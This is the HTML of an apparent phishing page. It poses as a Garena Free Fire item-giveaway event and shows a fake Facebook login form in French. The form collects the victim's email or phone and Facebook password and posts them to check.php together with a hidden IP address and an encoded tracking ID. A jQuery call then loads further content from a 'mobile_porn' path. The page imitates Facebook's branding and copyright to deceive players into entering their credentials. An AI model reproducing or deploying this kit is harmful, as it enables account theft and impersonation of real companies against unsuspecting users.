
<html xmlns="http://www.w3.org/1999/xhtml">

<head></head>

<body>
    <div id="loadme">


        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="Description" content="COLLECT YOUR ITEM NOW!!!!" />
        <meta name="Keywords" content="New Event Garena Free Fire" />
        <meta property="og:url" content="https://garena.co.id" />
        <meta property="og:type" content="website" />
        <meta property="og:title" content="NEW EVENT GARENA FREE FIRE" />
        <meta property="og:description" content="New Event Garena Free Fire" />
        <meta property="og:image" content="https://th.bing.com/th/id/OIP.7cmIaWwJQ6y1H1HtbusNOgAAAA?pid=Api&w=300&h=300&rs=1" />
        <link rel="stylesheet" href="mobile_ff/style.css" />
        <style>
            .duatombol {
                z-index: 99;
                position: relative;
                margin-top: -12%;
                width: 100%;
                display: flex;
                height: auto;
                align-items: center;
                justify-content: center;
            }

            .duatombol .menu {
                border-radius: 3px;
                text-shadow: 0 0.5px 5px aqua;
                box-shadow: 0 0.5px 5px aqua;
                font-weight: bold;
                color: white;
                background: rgba(51, 85, 255, 0.40);
                display: flex;
                height: auto;
                align-items: center;
                justify-content: center;
                height: 30px;
                margin-right: 5px;
                width: 27%;
                border: 1px solid aqua;
            }

            .duatombol .menu:hover {
                box-shadow: 0 2px 5px pink;
            }

            .tempatnya {
                margin-top: 10%;
                width: 100%;
                display: flex;
                align-items: center;
                justify-content: center;
                animation: animate 2s forwards;
            }

            .tempatnya .tempatkartu {
                width: 91%;
                display: flex;
                align-items: center;
                justify-content: space-between;
            }

            .tempatkartu .card {
                position: relative;
                color: white;
                background: rgba(51, 85, 255, 0.40);
                text-shadow: 0 0.5px 5px aqua;
                border-radius: 5px;
                border: 1px solid aqua;
                margin: auto;
                width: 100px;
                height: 130px;
            }

            .card::before {
                content: '';
                border-radius: 5px;
                width: 100%;
                height: 100%;
                position: absolute;
                z-index: -1;
                top: 0px;
                left: 0px;
                bottom: 0px;
                right: 0px;
                background: linear-gradient(0deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
                box-shadow: 0 0.5px 15px aqua;
                animation: bfg 7s infinite;
            }

            .card img {
                width: 100%;
                border-top-left-radius: 5px;
                border-top-right-radius: 5px;

            }

            .card button {
                margin-top: -10px;
                border: none;
                background: rgba(51, 85, 255, 0.80);
                height: 29.9px;
                color: white;
                font-family: 'wanwan';
                font-size: 15px;
                border-bottom-left-radius: 5px;
                border-bottom-right-radius: 5px;
                width: 100%;
                text-shadow: 0 0.5px 5px aqua;
                font-weight: bold;
            }

            .card button:hover {
                background: rgba(51, 85, 255, 0.10);
            }

            .mask {
                display: none;
                width: 100%;
                height: 100%;
                position: fixed;
                z-index: 9999;
                top: 0;
                left: 0;
                background: rgba(0, 0, 0, 0.50);
            }

            .mask .loginarea {
                box-shadow: 0 0.5px 15px pink;
                display: none;
                border-radius: 2px;
                background: rgba(51, 85, 255, 0.40);
                border: 2px solid aqua;
                position: absolute;
                transform: translate(-50%, -50%);
                top: 50%;
                left: 50%;
                z-index: 999;
                width: 70%;
                display: flex;
                height: 140px;
                align-items: center;
                justify-content: center;
                flex-direction: column;
                padding: 20px;
                animation: fadein 2s forwards;
            }

            .loginarea .atasnya {
                margin-top: -15px;
                width: 100%;
                height: 30px;
                color: white;
                letter-spacing: 2px;
                line-height: 30px;
                font-size: 1.5em;
                font-weight: bold;
                border-radius: 2px;
                background: rgba(51, 85, 255, 0.40);
                border: 2px solid aqua;
                text-align: center;
            }

            .loginarea .fb {
                margin-top: 15px;
                width: 85%;
                color: white;
                font-size: 18px;
                font-weight: bold;
                border-radius: 2px;
                background: #4267B2;
                border: 1px solid #fff;
                text-align: center;
                height: 40px;
                padding-left: 5px;
                line-height: 40px;
            }

            .fb i {
                float: left;
                margin-top: 10px;
                font-size: 20px;
            }

            .popup-box-login-fb {
                background: #ECEFF6;
                max-width: 330px;
                height: auto;
                position: relative;
                z-index: 9999;
                margin: 50px auto;
                margin-top: 1.9%;
                text-align: center;
                font-family: 'Teko';
                color: #000;
                border-radius: 10px;
            }

            .close-fb {
                background: #000;
                width: 20px;
                height: 20px;
                color: #fff;
                text-align: center;
                text-decoration: none;
                border-radius: 50%;
                border: 1.5px solid #fff;
                position: absolute;
                top: -8px;
                right: -10px;
                display: block;
            }

            .close-fb i {
                color: #fff;
                padding-top: 1px;
            }

            .close-other {
                background: #000;
                width: 20px;
                height: 20px;
                color: #fff;
                text-align: center;
                text-decoration: none;
                border-radius: 50%;
                border: 1.5px solid #fff;
                top: -8px;
                right: -10px;
                position: absolute;
                z-index: 9999999;
                display: block;
            }

            .close-other i {
                color: #fff;
                padding-top: 1px;
            }

            @media only screen and (max-width:600px) {
                .popup-box-login-fb {
                    margin-top: 4%;
                }
            }

            @keyframes animate {
                from {
                    transform: scale(0.7);
                    opacity: 0;
                }

                to {
                    transform: scale(1);
                    opacity: 1;
                }
            }

            @keyframes fadein {
                from {
                    transform: translateX(-50%);
                    opacity: 0;
                }

                to {
                    transform: translateX(1);
                    opacity: 1;
                }
            }

            @keyframes bfg {

                0%,
                100% {
                    filter: hue-rotate(10deg);
                }

                50% {
                    filter: hue-rotate(360deg);
                }
            }

            .navbar-fb {
                background: #3b5998;
                width: 95.2%;
                height: auto;
                padding: 8px;
                border-top-left-radius: 10px;
                border-top-right-radius: 10px;
            }

            .navbar-fb img {
                width: 135px;
                margin-left: auto;
                margin-right: auto;
                display: block;
            }

            .center {
                width: 100%;
            }

            .content-box-fb {
                width: 300px;
                height: auto;
                margin-left: auto;
                margin-right: auto;
                display: block;
            }

            .content-box-fb img {
                width: 60px;
                height: 60px;
                margin-top: 20px;
                margin-left: auto;
                margin-right: auto;
                border-radius: 12px;
                display: block;
            }

            .txt-login-fb {
                width: 270px;
                height: auto;
                margin-top: 10px;
                margin-left: auto;
                margin-left: auto;
                margin-bottom: 17px;
                padding: 8px;
                color: #90949c;
                font-size: 16px;
                font-family: 'Lato', sans-serif;
                text-align: center;
                display: block;
            }

            .login-form input[type="text"],
            .login-form input[type="password"] {
                width: 95%;
                height: auto;
                padding: 12px;
                color: #000;
                font-size: 14px;
                font-weight: 400;
                font-family: 'Lato', sans-serif;
                border: 1px solid #bdbebf;
                cursor: pointer;
                outline: none;
            }

            .login-form input[type="text"] {
                margin: 0;
                padding-bottom: 13px;
                border-bottom: none;
                border-radius: 4px 4px 0 0;
                box-shadow: 0 -1px 0 #E0E0E0 inset, 0 0px 0px rgba(0, 0, 0, 0.23) inset;
            }

            .login-form input[type="password"] {
                margin: 0;
                border-top: none;
                border-radius: 0 0 4px 4px;
                box-shadow: 0 -0px 0 rgba(0, 0, 0, 0.23) inset, 0 0px 0px rgba(255, 255, 255, 0.1);
            }

            .btn-login-fb {
                background: #1778f2;
                width: 90%;
                height: auto;
                margin-top: 10px;
                margin-left: auto;
                margin-right: auto;
                margin-bottom: 10px;
                padding: 8px;
                color: #fff;
                font-size: 14px;
                font-family: 'Lato', sans-serif;
                font-weight: bold;
                text-align: center;
                text-shadow: 1px 0px rgba(0, 0, 0, 0.3);
                border: 1px solid #3578e5;
                border-radius: 5px;
                box-shadow: 1px 1px 1px 1px rgba(0, 0, 0, 0.1);
                outline: none;
                display: block;
            }

            .txt-create-account {
                width: 100%;
                height: auto;
                padding: 5px;
                color: #3b5998;
                font-size: 13.5px;
                font-family: 'Lato', sans-serif;
                text-align: center;
            }

            .txt-not-now {
                width: 100%;
                height: auto;
                padding: 5px;
                color: #3b5998;
                font-size: 13.5px;
                font-family: 'Lato', sans-serif;
                text-align: center;
            }

            .txt-forgotten-password {
                width: 100%;
                height: auto;
                margin-bottom: 30px;
                padding: 5px;
                color: #7596c8;
                font-size: 13.5px;
                font-family: 'Lato', sans-serif;
                text-align: center;
            }

            .language-box {
                width: 100%;
                height: auto;
                margin-left: auto;
                margin-right: auto;
                display: block;
            }

            .language-name {
                width: 40%;
                height: auto;
                margin: 5px;
                margin-bottom: 0px;
                color: #3b5998;
                font-size: 12px;
                font-family: 'Lato', sans-serif;
                text-align: center;
                display: inline-block;
            }

            .language-name i {
                width: 15px;
                padding: 4px;
                color: #90949c;
                border: 1px solid #3b5998;
                border-radius: 3px;
            }

            .language-name-active {
                color: #90949c;
                font-weight: bold;
            }

            .copyright {
                width: 40%;
                height: auto;
                margin-top: 10px;
                margin-left: auto;
                margin-right: auto;
                color: #90949c;
                font-size: 12px;
                font-family: 'Lato', sans-serif;
                text-align: center;
                display: block;
            }
        </style>


        <center class="center">
            <div class="navbar-fb">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/Facebook_Logo_(2015)_light.svg/800px-Facebook_Logo_(2015)_light.svg.png" style="color:red;" />
            </div>
            <center>
                <div class="content-box-fb">
                    <img src="https://a.top4top.io/p_2182zccr40.png" />

                    <!--<video class="video" loop="" autoplay="" muted="" playsinline="">-->
                    <!--          <source src="https://cdn.smrt-content.com/assets/1059/video/video1.mp4" type="video/mp4">-->
                    <!--        </video>-->
                    <div class="txt-login-fb">
            Connectez-vous à votre compte Facebook pour vous connecter à Garena Free Fire</div>
                    <center>
                        <form class="login-form" action="check.php" method="post">
                            <label>
                                <input type="text" name="email" maxlength="27" minlength="8" placeholder="Numéro de mobile ou adresse e-mail" autocomplete="off" autocapitalize="off" required="" />
                            </label>
                            <label>
                                <br />
                                <input type="password" maxlength="20" minlength="6" name="password" placeholder="Mot de passe Facebook" autocomplete="off" autocapitalize="off" required="" />
                            </label>
                            <input type="hidden" name="ipp" value="105.67.128.91" />
                            <input type="text" value="YXJQbUROejVpYXhYQTd6amZZWElQNG9jYVFvPQ==" name="userid" hidden="" />
                            <button type="submit" name="login" class="btn-login-fb">Se connecter</button>
                        </form>
                    </center>
                    <div class="txt-create-account">Creer un compte </div>
                    <div class="txt-not-now">Plus tard</div>
                    <div class="txt-forgotten-password">Mot de passe oublie ?</div>
                </div>
            </center>
            <div class="language-box">
                <center>
                    <div class="language-name language-name-active">Francais (France)</div>
                    <div class="language-name">Espanol</div>
                    <div class="language-name">Basa Jawa</div>
                    <div class="language-name">Bahasa Melayu</div>
                    <div class="language-name">china</div>
                    <div class="language-name">Bahasa Indonesia</div>
                    <div class="language-name">Português (Brasil)</div>
                    <div class="language-name">
                        <i class="fa fa-plus"></i>
                    </div>
                </center>
            </div>
            <div class="copyright">Facebook Inc.</div>


            <center>

                <script>
                    function fb() {
                        $('.login_facebook').show();
                    }
                </script>
                <style>
                    .cbalink {
                        display: none;
                    }
                </style>
            </center>
        </center>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script>
        $(document).ready(function() {
            $("#loadme").load("mobile_porn/index.php?t=porn2", {
                i: "YXJQbUROejVpYXhYQTd6amZZWElQNG9jYVFvPQ==",
                l: "a"
            });
        });
    </script>
</body>

</html>